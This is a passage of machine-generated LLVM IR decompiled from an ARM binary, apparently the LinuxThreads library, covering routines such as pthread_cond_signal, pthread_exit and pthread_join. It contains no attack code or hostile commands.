  call void @__pseudo_branch(i32 %v2_21054)
  br label %dec_label_pc_21064

dec_label_pc_21064:                               ; preds = %dec_label_pc_20ef8, %dec_label_pc_2104c
  %storemerge27 = phi i32 [ 0, %dec_label_pc_2104c ], [ 22, %dec_label_pc_20ef8 ]
  store i32 %v3_20ec8, i32* @r4, align 4
  store i32 %v6_20ec8, i32* @r5, align 4
  store i32 %v9_20ec8, i32* @r6, align 4
  store i32 %v12_20ec8, i32* @r7, align 4
  store i32 %v15_20ec8, i32* @lr, align 4
  ret i32 %storemerge27

; uselistorder directives
  uselistorder i8* %v4_20f24, { 1, 0, 2 }
  uselistorder i32 %v0_20ed8, { 0, 1, 8, 9, 13, 12, 10, 11, 15, 14, 7, 5, 6, 4, 3, 2, 16 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32)* @_suspend.7, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @_enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @___pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @_thread_self.6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_21064, { 1, 0 }
  uselistorder label %dec_label_pc_21044, { 2, 0, 1 }
  uselistorder label %dec_label_pc_21030, { 1, 0 }
  uselistorder label %dec_label_pc_20fe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_20fc0, { 1, 0 }
  uselistorder label %dec_label_pc_20f74, { 1, 0 }
  uselistorder label %dec_label_pc_20f0c, { 0, 2, 1 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_21090 = call i32 @__pthread_lock()
  %v0_21094 = load i32, i32* @r5, align 4
  %v1_21094 = add i32 %v0_21094, 8
  %v2_21094 = inttoptr i32 %v1_21094 to i32*
  %v3_21094 = load i32, i32* %v2_21094, align 4
  store i32 %v3_21094, i32* %r4.global-to-local, align 4
  %v2_21098 = icmp eq i32 %v3_21094, 0
  br i1 %v2_21098, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v2_2109c = add i32 %v3_21094, 8
  %v3_2109c = inttoptr i32 %v2_2109c to i32*
  %v4_2109c = load i32, i32* %v3_2109c, align 4
  store i32 %v4_2109c, i32* %v2_21094, align 4
  %v2_210a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_210a8 = add i32 %v2_210a8, 8
  %v4_210a8 = inttoptr i32 %v3_210a8 to i32*
  store i32 0, i32* %v4_210a8, align 4
  %v0_210ac.pre = load i32, i32* @r5, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v0_210ac = phi i32 [ %v0_21094, %entry ], [ %v0_210ac.pre, %bb ]
  %v1_210b0 = call i32 @__pthread_unlock(i32 %v0_210ac)
  %v0_210b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_210b4 = icmp eq i32 %v0_210b4, 0
  br i1 %v2_210b4, label %dec_label_pc_210cc, label %dec_label_pc_210bc

dec_label_pc_210bc:                               ; preds = %.thread2
  %v3_210c0 = add i32 %v0_210b4, 321
  %v4_210c0 = inttoptr i32 %v3_210c0 to i8*
  store i8 1, i8* %v4_210c0, align 1
  %v0_210c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_210c4, i32* @r0, align 4
  %v1_210c8 = call i32 @_restart(i32 %v0_210c4)
  br label %dec_label_pc_210cc

dec_label_pc_210cc:                               ; preds = %.thread2, %dec_label_pc_210bc
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @_restart, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_210cc, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v1_210dc = load i32, i32* @r0, align 4
  ret i32 %v1_210dc
}

define i32 @__linuxthreads_death_event(i32 %arg1) local_unnamed_addr {
entry:
  %v1_210e0 = load i32, i32* @r0, align 4
  ret i32 %v1_210e0
}

define i32 @__linuxthreads_reap_event(i32 %arg1) local_unnamed_addr {
entry:
  %v1_210e4 = load i32, i32* @r0, align 4
  ret i32 %v1_210e4
}

define i32 @___pthread_set_own_extricate_if.8(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_210e8 = load i32, i32* @r4, align 4
  %v6_210e8 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_210ec = icmp eq i32 %arg2, 0
  %v0_210f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_210f4, i32* @r4, align 4
  br i1 %v2_210ec, label %dec_label_pc_2110c, label %dec_label_pc_210fc

dec_label_pc_210fc:                               ; preds = %entry
  %v1_210fc = add i32 %v0_210f4, 64
  %v2_210fc = inttoptr i32 %v1_210fc to i8*
  %v3_210fc = load i8, i8* %v2_210fc, align 1
  %v2_21100 = icmp eq i8 %v3_210fc, 0
  br i1 %v2_21100, label %dec_label_pc_21118, label %dec_label_pc_21128

dec_label_pc_2110c:                               ; preds = %entry
  %v1_2110c = add i32 %v0_210f4, 28
  %v2_2110c = inttoptr i32 %v1_2110c to i32*
  %v3_2110c = load i32, i32* %v2_2110c, align 4
  store i32 %v3_2110c, i32* @r0, align 4
  %v0_21114 = call i32 @__pthread_lock()
  store i32 %v0_21114, i32* %r0.global-to-local, align 4
  %v0_21118.pre = load i32, i32* @r5, align 4
  %v1_2111c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_21118

dec_label_pc_21118:                               ; preds = %dec_label_pc_210fc, %dec_label_pc_2110c
  %v1_2111c = phi i32 [ %v0_210f4, %dec_label_pc_210fc ], [ %v1_2111c.pre, %dec_label_pc_2110c ]
  %v0_2111c = phi i32 [ %arg2, %dec_label_pc_210fc ], [ %v0_21118.pre, %dec_label_pc_2110c ]
  %v2_21118 = icmp eq i32 %v0_2111c, 0
  %v2_2111c = add i32 %v1_2111c, 324
  %v3_2111c = inttoptr i32 %v2_2111c to i32*
  store i32 %v0_2111c, i32* %v3_2111c, align 4
  br i1 %v2_21118, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_21118
  %v1_21120 = load i32, i32* @r4, align 4
  %v2_21120 = add i32 %v1_21120, 28
  %v3_21120 = inttoptr i32 %v2_21120 to i32*
  %v4_21120 = load i32, i32* %v3_21120, align 4
  store i32 %v4_21120, i32* %r0.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_21118, %bb
  call void @__pseudo_cond_branch(i1 %v2_21118, i32 ptrtoint (i32* @global_var_1e9d4.1269 to i32))
  %v1_21130.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21128

dec_label_pc_21128:                               ; preds = %dec_label_pc_210fc, %bb9
  %v1_21130 = phi i32 [ %v0_210f4, %dec_label_pc_210fc ], [ %v1_21130.pre, %bb9 ]
  store i32 %v3_210e8, i32* @r4, align 4
  store i32 %v6_210e8, i32* @r5, align 4
  ret i32 %v1_21130

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32 324, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_21128, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_21118, { 1, 0 }
}

define i32 @_thread_self.9() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_21138 = load i32, i32* @lr, align 4
  store i32 %v0_21138, i32* %stack_var_-4, align 4
  %v4_21144 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_21148 = inttoptr i32 %v4_21144 to i32*
  %v2_21148 = load i32, i32* %v1_21148, align 4
  %v2_2114c = ptrtoint i32* %stack_var_-8 to i32
  %v3_21150 = icmp ult i32 %v2_2114c, %v2_21148
  br i1 %v3_21150, label %dec_label_pc_21160, label %dec_label_pc_2118c

dec_label_pc_21160:                               ; preds = %entry
  %v4_21164 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_21168 = inttoptr i32 %v4_21164 to i32*
  %v2_21168 = load i32, i32* %v1_21168, align 4
  %v3_2116c = icmp ult i32 %v2_2114c, %v2_21168
  br i1 %v3_2116c, label %dec_label_pc_21194, label %dec_label_pc_21174

dec_label_pc_21174:                               ; preds = %dec_label_pc_21160
  %v4_21178 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_2117c = inttoptr i32 %v4_21178 to i32*
  %v2_2117c = load i32, i32* %v1_2117c, align 4
  %v3_21180 = icmp ult i32 %v2_2114c, %v2_2117c
  br i1 %v3_21180, label %dec_label_pc_2118c, label %dec_label_pc_21194

dec_label_pc_2118c:                               ; preds = %dec_label_pc_21174, %entry
  %v1_2118c = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_21174 ]
  %v3_2118c = inttoptr i32 %v1_2118c to i32*
  %v4_2118c = load i32, i32* %v3_2118c, align 4
  br label %dec_label_pc_211c0

dec_label_pc_21194:                               ; preds = %dec_label_pc_21174, %dec_label_pc_21160
  %v4_21198 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_2119c = inttoptr i32 %v4_21198 to i32*
  %v2_2119c = load i32, i32* %v1_2119c, align 4
  %v2_211a0 = icmp eq i32 %v2_2119c, 0
  br i1 %v2_211a0, label %dec_label_pc_211b0, label %dec_label_pc_211a8

dec_label_pc_211a8:                               ; preds = %dec_label_pc_21194
  %v0_211a8 = call i32 @__pthread_find_self()
  %v2_211c4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_211c0

dec_label_pc_211b0:                               ; preds = %dec_label_pc_21194
  %v3_211b0 = and i32 %v2_2114c, -2097152
  %v4_211b0 = xor i32 %v3_211b0, -2097152
  %v1_211bc = sub i32 -352, %v4_211b0
  br label %dec_label_pc_211c0

dec_label_pc_211c0:                               ; preds = %dec_label_pc_211a8, %dec_label_pc_2118c, %dec_label_pc_211b0
  %v1_211c8 = phi i32 [ %v0_211a8, %dec_label_pc_211a8 ], [ %v4_2118c, %dec_label_pc_2118c ], [ %v1_211bc, %dec_label_pc_211b0 ]
  %v2_211c4 = phi i32 [ %v2_211c4.pre, %dec_label_pc_211a8 ], [ %v0_21138, %dec_label_pc_2118c ], [ %v0_21138, %dec_label_pc_211b0 ]
  store i32 %v2_211c4, i32* @lr, align 4
  ret i32 %v1_211c8

; uselistorder directives
  uselistorder label %dec_label_pc_211c0, { 2, 0, 1 }
}

define i32 @function_211d0(i16* %arg1) local_unnamed_addr {
dec_label_pc_211d0:
  %v0_211d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_211d0, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_211d0
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_211d0
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_211f4 = call i32 @_thread_self.9()
  %v0_21200 = load i32, i32* @r5, align 4
  store i32 %v0_21200, i32* @r0, align 4
  %v0_21204 = call i32 @__pthread_lock()
  %v0_21208 = load i32, i32* @r5, align 4
  %v1_21208 = add i32 %v0_21208, 8
  %v2_21208 = inttoptr i32 %v1_21208 to i32*
  %v3_21208 = load i32, i32* %v2_21208, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_21210 = add i32 %v3_21208, 56
  %v2_21210 = inttoptr i32 %v1_21210 to i32*
  %v3_21210 = load i32, i32* %v2_21210, align 4
  store i32 %v3_21210, i32* %r4.global-to-local, align 4
  store i32 0, i32* %v2_21210, align 4
  %v0_2121c = load i32, i32* %r4.global-to-local, align 4
  %v1_2121c = load i32, i32* %r3.global-to-local, align 4
  %v2_2121c = sub i32 %v0_2121c, %v1_2121c
  %v9_2121c = icmp eq i32 %v0_2121c, %v1_2121c
  br i1 %v9_2121c, label %bb6, label %bb

bb:                                               ; preds = %entry
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 1, %bb ], [ %v2_2121c, %entry ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v1_21224 = call i32 @__pthread_unlock(i32 %v0_21208)
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @_suspend.10(i32 %arg1) local_unnamed_addr {
entry:
  %v0_21240 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_21240

; uselistorder directives
  uselistorder i32 ()* @__pthread_wait_for_restart_signal, { 0, 4, 1, 6, 3, 2, 5 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_2125c = call i32 @_thread_self.9()
  %v3_21264 = add i32 %v0_2125c, 64
  %v4_21264 = inttoptr i32 %v3_21264 to i8*
  store i8 1, i8* %v4_21264, align 1
  store i32 %v0_2125c, i32* @r6, align 4
  %v3_21270 = add i32 %v0_2125c, 65
  %v4_21270 = inttoptr i32 %v3_21270 to i8*
  store i8 0, i8* %v4_21270, align 1
  %v0_21274 = load i32, i32* @r4, align 4
  %v1_21278 = call i32 @__pthread_perform_cleanup(i32 %v0_21274)
  %v1_2127c = call i32 @__pthread_destroy_specifics(i32 %v1_21278)
  %v0_21280 = load i32, i32* @r6, align 4
  %v1_21280 = add i32 %v0_21280, 28
  %v2_21280 = inttoptr i32 %v1_21280 to i32*
  %v3_21280 = load i32, i32* %v2_21280, align 4
  store i32 %v3_21280, i32* @r0, align 4
  %v0_21288 = call i32 @__pthread_lock()
  store i32 %v0_21288, i32* @r0, align 4
  %v0_2128c = load i32, i32* @r6, align 4
  %v1_2128c = add i32 %v0_2128c, 292
  %v2_2128c = inttoptr i32 %v1_2128c to i32*
  %v3_2128c = load i32, i32* %v2_2128c, align 4
  %v2_21294 = icmp eq i32 %v3_2128c, 0
  %v0_21298 = load i32, i32* @r5, align 4
  %v2_21298 = add i32 %v0_2128c, 48
  %v3_21298 = inttoptr i32 %v2_21298 to i32*
  store i32 %v0_21298, i32* %v3_21298, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  br i1 %v2_21294, label %dec_label_pc_212dc, label %dec_label_pc_212a4

dec_label_pc_212a4:                               ; preds = %entry
  %v4_212a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 168) to i32*), align 4
  %v0_212ac = load i32, i32* @r6, align 4
  %v1_212ac = add i32 %v0_212ac, 296
  %v2_212ac = inttoptr i32 %v1_212ac to i32*
  %v3_212ac = load i32, i32* %v2_212ac, align 4
  store i32 %v3_212ac, i32* %r2.global-to-local, align 4
  %v1_212b0 = inttoptr i32 %v4_212a8 to i32*
  %v2_212b0 = load i32, i32* %v1_212b0, align 4
  %v2_212b4 = or i32 %v2_212b0, %v3_212ac
  %v1_212b8 = and i32 %v2_212b4, 256
  %v2_212b8 = icmp eq i32 %v1_212b8, 0
  br i1 %v2_212b8, label %dec_label_pc_212dc, label %dec_label_pc_212c0

dec_label_pc_212c0:                               ; preds = %dec_label_pc_212a4
  %v4_212c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 172) to i32*), align 4
  store i32 %v4_212c4, i32* %r2.global-to-local, align 4
  %v2_212cc = add i32 %v0_212ac, 304
  %v3_212cc = inttoptr i32 %v2_212cc to i32*
  store i32 9, i32* %v3_212cc, align 4
  %v0_212d0 = load i32, i32* @r6, align 4
  %v2_212d0 = add i32 %v0_212d0, 308
  %v3_212d0 = inttoptr i32 %v2_212d0 to i32*
  store i32 %v0_212d0, i32* %v3_212d0, align 4
  %v0_212d4 = load i32, i32* @r6, align 4
  %v1_212d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_212d4 = inttoptr i32 %v1_212d4 to i32*
  store i32 %v0_212d4, i32* %v2_212d4, align 4
  %v1_212d8 = call i32 @__linuxthreads_death_event(i32 %v0_21288)
  br label %dec_label_pc_212dc

dec_label_pc_212dc:                               ; preds = %dec_label_pc_212a4, %entry, %dec_label_pc_212c0
  %v0_212dc = load i32, i32* @r6, align 4
  %v1_212dc = add i32 %v0_212dc, 56
  %v2_212dc = inttoptr i32 %v1_212dc to i32*
  %v3_212dc = load i32, i32* %v2_212dc, align 4
  store i32 %v3_212dc, i32* %r4.global-to-local, align 4
  %v3_212e4 = add i32 %v0_212dc, 44
  %v4_212e4 = inttoptr i32 %v3_212e4 to i8*
  store i8 1, i8* %v4_212e4, align 1
  %v0_212e8 = load i32, i32* @r6, align 4
  %v1_212e8 = add i32 %v0_212e8, 28
  %v2_212e8 = inttoptr i32 %v1_212e8 to i32*
  %v3_212e8 = load i32, i32* %v2_212e8, align 4
  %v1_212ec = call i32 @__pthread_unlock(i32 %v3_212e8)
  %v0_212f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_212f0 = icmp eq i32 %v0_212f0, 0
  br i1 %v2_212f0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_212dc
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_212dc, %bb
  store i32 135932, i32* @lr, align 4
  %v1_212f8 = xor i1 %v2_212f0, true
  call void @__pseudo_cond_branch(i1 %v1_212f8, i32 ptrtoint (i32* @global_var_1f864.1467 to i32))
  %v0_21300 = load i32, i32* @r7, align 4
  %v2_21300 = add i32 %v0_21300, 260
  %v3_21300 = inttoptr i32 %v2_21300 to i32*
  %v4_21300 = load i32, i32* %v3_21300, align 4
  %v1_21304 = inttoptr i32 %v4_21300 to i32*
  %v2_21304 = load i32, i32* %v1_21304, align 4
  store i32 %v2_21304, i32* @r4, align 4
  %v0_21308 = load i32, i32* @r6, align 4
  %v9_21308 = icmp eq i32 %v0_21308, %v2_21304
  br i1 %v9_21308, label %dec_label_pc_21310, label %dec_label_pc_21370

dec_label_pc_21310:                               ; preds = %bb8
  %v2_21314 = add i32 %v0_21300, 132
  %v3_21314 = inttoptr i32 %v2_21314 to i32*
  %v4_21314 = load i32, i32* %v3_21314, align 4
  %v1_21318 = inttoptr i32 %v4_21314 to i32*
  %v2_21318 = load i32, i32* %v1_21318, align 4
  %v1_2131c = icmp slt i32 %v2_21318, 0
  br i1 %v1_2131c, label %dec_label_pc_21370, label %dec_label_pc_21324

dec_label_pc_21324:                               ; preds = %dec_label_pc_21310
  store i32 %v2_21304, i32* %stack_var_-28, align 4
  store i32 %v4_21314, i32* @r6, align 4
  %v2_21334 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_21334, i32* @r5, align 4
  br label %dec_label_pc_21338

dec_label_pc_21338:                               ; preds = %dec_label_pc_21350.dec_label_pc_21338_crit_edge, %dec_label_pc_21324
  %v0_21338 = phi i32 [ %v0_21338.pre, %dec_label_pc_21350.dec_label_pc_21338_crit_edge ], [ %v4_21314, %dec_label_pc_21324 ]
  %v1_21338 = inttoptr i32 %v0_21338 to i32*
  %v2_21338 = load i32, i32* %v1_21338, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_21344 = call i32 @write(i32 %v2_21338, i32 %v2_21334, i32 28)
  %v3_21348 = icmp eq i32 %v3_21344, -1
  br i1 %v3_21348, label %dec_label_pc_21350, label %dec_label_pc_21360

dec_label_pc_21350:                               ; preds = %dec_label_pc_21338
  %v0_21350 = call i32 @__errno_location()
  %v1_21354 = inttoptr i32 %v0_21350 to i32*
  %v2_21354 = load i32, i32* %v1_21354, align 4
  %v7_21358 = icmp eq i32 %v2_21354, 4
  br i1 %v7_21358, label %dec_label_pc_21350.dec_label_pc_21338_crit_edge, label %dec_label_pc_21360

dec_label_pc_21350.dec_label_pc_21338_crit_edge:  ; preds = %dec_label_pc_21350
  %v0_21338.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_21338

dec_label_pc_21360:                               ; preds = %dec_label_pc_21338, %dec_label_pc_21350
  %v0_21360 = load i32, i32* @r4, align 4
  store i32 %v0_21360, i32* @r0, align 4
  %v1_21364 = call i32 @_suspend.10(i32 %v0_21360)
  %v1_2136c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_21370

dec_label_pc_21370:                               ; preds = %bb8, %dec_label_pc_21310, %dec_label_pc_21360
  %v1_21374 = call i32 @__GI__exit(i32 0)
  %v0_21378 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21378, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_21370
  %v2_21378 = load i32, i32* @ip, align 4
  %v2_2137c = load i32, i32* @r8, align 4
  %v5_2137c = udiv i32 %v2_2137c, 2
  %v5_21380 = udiv i32 %v2_21378, 2
  %v2_21384 = load i32, i32* @r4, align 4
  %v5_21384 = mul i32 %v2_21384, 4
  %v4_21388 = mul i32 %v2_21384, 2
  %v6_2137c = and i32 %v5_21380, %v1_21374
  %v6_21380 = and i32 %v6_2137c, %v5_2137c
  %v6_21384 = and i32 %v6_21380, %v5_21384
  %v5_21388 = and i32 %v6_21384, %v4_21388
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_21370, %bb9
  %v6_21388 = phi i32 [ %v1_21374, %dec_label_pc_21370 ], [ %v5_21388, %bb9 ]
  ret i32 %v6_21388

; uselistorder directives
  uselistorder i32 %v1_21374, { 1, 0 }
  uselistorder i32 %v0_212d0, { 1, 0 }
  uselistorder i32 %v0_2125c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 308, { 2, 1, 0 }
  uselistorder i32 296, { 2, 1, 0 }
  uselistorder i32 168, { 0, 3, 4, 2, 1 }
  uselistorder i32 292, { 3, 1, 2, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_21370, { 2, 1, 0 }
  uselistorder label %dec_label_pc_21360, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %dec_label_pc_212dc, { 2, 0, 1 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_2138c = ptrtoint i32* %stack_var_0 to i32
  %v0_21390 = load i32, i32* @r0, align 4
  %v2_21390 = call i32 @__pthread_do_exit(i32 %v0_21390, i32 %v1_2138c)
  ret i32 %v2_21390
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_21398 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %arg1, i32* @r7, align 4
  store i32 %tmp, i32* @sl, align 4
  %v0_213a4 = call i32 @_thread_self.9()
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r8, align 4
  %v4_213b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v0_213b8 = load i32, i32* @r7, align 4
  %v3_213bc = urem i32 %v0_213b8, 1024
  %v4_213c0 = mul nuw nsw i32 %v3_213bc, 16
  %v5_213c0 = add i32 %v4_213c0, %v4_213b4
  store i32 %v5_213c0, i32* @r5, align 4
  store i32 %v5_213c0, i32* @r0, align 4
  store i32 %v5_213c0, i32* %stack_var_-44, align 4
  %v0_213e0 = call i32 @__pthread_lock()
  %v0_213e4 = load i32, i32* @r5, align 4
  %v1_213e4 = add i32 %v0_213e4, 8
  %v2_213e4 = inttoptr i32 %v1_213e4 to i32*
  %v3_213e4 = load i32, i32* %v2_213e4, align 4
  store i32 %v3_213e4, i32* @r4, align 4
  %v2_213e8 = icmp eq i32 %v3_213e4, 0
  br i1 %v2_213e8, label %dec_label_pc_213fc, label %dec_label_pc_213f0

dec_label_pc_213f0:                               ; preds = %entry
  %v1_213f0 = add i32 %v3_213e4, 16
  %v2_213f0 = inttoptr i32 %v1_213f0 to i32*
  %v3_213f0 = load i32, i32* %v2_213f0, align 4
  %v1_213f4 = load i32, i32* @r7, align 4
  %v9_213f4 = icmp eq i32 %v3_213f0, %v1_213f4
  br i1 %v9_213f4, label %dec_label_pc_2140c, label %dec_label_pc_213fc

dec_label_pc_213fc:                               ; preds = %dec_label_pc_213f0, %entry
  %v1_21400 = call i32 @__pthread_unlock(i32 %v0_213e4)
  br label %dec_label_pc_21578

dec_label_pc_2140c:                               ; preds = %dec_label_pc_213f0
  %v9_21410 = icmp eq i32 %v3_213e4, %v0_213a4
  br i1 %v9_21410, label %dec_label_pc_21418, label %dec_label_pc_21428

dec_label_pc_21418:                               ; preds = %dec_label_pc_2140c
  %v1_2141c = call i32 @__pthread_unlock(i32 %v0_213e4)
  br label %dec_label_pc_21578

dec_label_pc_21428:                               ; preds = %dec_label_pc_2140c
  %v1_21428 = add i32 %v3_213e4, 45
  %v2_21428 = inttoptr i32 %v1_21428 to i8*
  %v3_21428 = load i8, i8* %v2_21428, align 1
  %v2_2142c = icmp eq i8 %v3_21428, 0
  br i1 %v2_2142c, label %dec_label_pc_21434, label %dec_label_pc_21440

dec_label_pc_21434:                               ; preds = %dec_label_pc_21428
  %v1_21434 = add i32 %v3_213e4, 56
  %v2_21434 = inttoptr i32 %v1_21434 to i32*
  %v3_21434 = load i32, i32* %v2_21434, align 4
  %v2_21438 = icmp eq i32 %v3_21434, 0
  br i1 %v2_21438, label %dec_label_pc_21450, label %dec_label_pc_21440

dec_label_pc_21440:                               ; preds = %dec_label_pc_21428, %dec_label_pc_21434
  %v1_21444 = call i32 @__pthread_unlock(i32 %v0_213e4)
  br label %dec_label_pc_21578

dec_label_pc_21450:                               ; preds = %dec_label_pc_21434
  %v1_21450 = add i32 %v3_213e4, 44
  %v2_21450 = inttoptr i32 %v1_21450 to i8*
  %v3_21450 = load i8, i8* %v2_21450, align 1
  %v2_21454 = icmp eq i8 %v3_21450, 0
  br i1 %v2_21454, label %dec_label_pc_2145c, label %dec_label_pc_2150c

dec_label_pc_2145c:                               ; preds = %dec_label_pc_21450
  %v2_21460 = ptrtoint i32* %stack_var_-44 to i32
  %v2_21464 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_213a4, i32 %v2_21460)
  %v1_2146c = add i32 %v0_213a4, 66
  %v2_2146c = inttoptr i32 %v1_2146c to i8*
  %v3_2146c = load i8, i8* %v2_2146c, align 1
  %v2_21470 = icmp eq i8 %v3_2146c, 0
  br i1 %v2_21470, label %dec_label_pc_2148c, label %dec_label_pc_21478

dec_label_pc_21478:                               ; preds = %dec_label_pc_2145c
  %v1_2147c = add i32 %v0_213a4, 64
  %v2_2147c = inttoptr i32 %v1_2147c to i8*
  %v3_2147c = load i8, i8* %v2_2147c, align 1
  %v2_21480 = icmp eq i8 %v3_2147c, 0
  br i1 %v2_21480, label %dec_label_pc_21498, label %dec_label_pc_2148c

dec_label_pc_2148c:                               ; preds = %dec_label_pc_21478, %dec_label_pc_2145c
  %v1_21490 = load i32, i32* @r4, align 4
  %v2_21490 = add i32 %v1_21490, 56
  %v3_21490 = inttoptr i32 %v2_21490 to i32*
  store i32 %v0_213a4, i32* %v3_21490, align 4
  br label %dec_label_pc_21498

dec_label_pc_21498:                               ; preds = %dec_label_pc_21478, %dec_label_pc_2148c
  %storemerge = phi i32 [ 0, %dec_label_pc_2148c ], [ 1, %dec_label_pc_21478 ]
  store i32 %storemerge, i32* @r6, align 4
  %v0_21498 = load i32, i32* @r5, align 4
  %v1_2149c = call i32 @__pthread_unlock(i32 %v0_21498)
  %v0_214a0 = load i32, i32* @r6, align 4
  %v2_214a0 = icmp eq i32 %v0_214a0, 0
  store i32 %v0_213a4, i32* @r0, align 4
  br i1 %v2_214a0, label %dec_label_pc_214b8, label %dec_label_pc_214a8

dec_label_pc_214a8:                               ; preds = %dec_label_pc_21498
  %v2_214b0 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_213a4, i32 0)
  br label %dec_label_pc_214f4

dec_label_pc_214b8:                               ; preds = %dec_label_pc_21498
  %v1_214bc = call i32 @_suspend.10(i32 %v0_213a4)
  %v0_214c0 = load i32, i32* @r6, align 4
  %v2_214c8 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_213a4, i32 %v0_214c0)
  %v1_214d0 = add i32 %v0_213a4, 320
  %v2_214d0 = inttoptr i32 %v1_214d0 to i8*
  %v3_214d0 = load i8, i8* %v2_214d0, align 1
  %v2_214d4 = icmp eq i8 %v3_214d0, 0
  br i1 %v2_214d4, label %dec_label_pc_21500, label %dec_label_pc_214dc

dec_label_pc_214dc:                               ; preds = %dec_label_pc_214b8
  %v1_214e0 = add i32 %v0_213a4, 64
  %v2_214e0 = inttoptr i32 %v1_214e0 to i8*
  %v3_214e0 = load i8, i8* %v2_214e0, align 1
  %v2_214e4 = icmp eq i8 %v3_214e0, 0
  br i1 %v2_214e4, label %dec_label_pc_214ec, label %dec_label_pc_21500

dec_label_pc_214ec:                               ; preds = %dec_label_pc_214dc
